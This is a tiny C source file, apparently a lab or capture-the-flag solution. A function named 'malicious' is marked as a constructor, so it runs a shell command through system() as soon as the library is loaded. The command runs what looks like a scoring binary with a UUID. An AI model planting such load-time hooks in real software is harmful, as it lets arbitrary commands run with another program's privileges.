#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious(){
	system("/usr/local/bin/score 542270d8-b7ce-4b7e-a17e-dfecb046a905");
}
